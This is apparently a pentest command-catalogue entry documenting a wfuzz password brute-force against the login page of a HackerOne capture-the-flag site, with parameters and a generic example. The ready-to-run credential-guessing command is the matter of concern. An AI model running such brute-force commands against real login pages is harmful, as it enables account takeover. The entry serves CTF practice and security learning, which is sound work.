---
id: cmd-uuid-8
data: >-
  wfuzz -z file,wordlists/passwords.txt --hs 'Invalid Password' -d
  'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login
tags:
  - bruteforce
type: command
output: Found computer.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:55.443Z'
verified: false
validated: true
submitted: true
---
# Wfuzz Brute Password

## Command

```bash
wfuzz -z file,wordlists/passwords.txt --hs 'Invalid Password' -d 'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login
```

## Description

Brute-forces passwords with known username.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --hs | Hide string | No |
| -d | POST data | Yes |

## Examples

### Basic Usage

```bash
wfuzz -z file,pass.txt --hs invalid https://login
```

## Expected Output

Valid password.

## Related

- [[procedures/Brute-Force-Credentials-and-Manipulate-Base64-Cookie]]
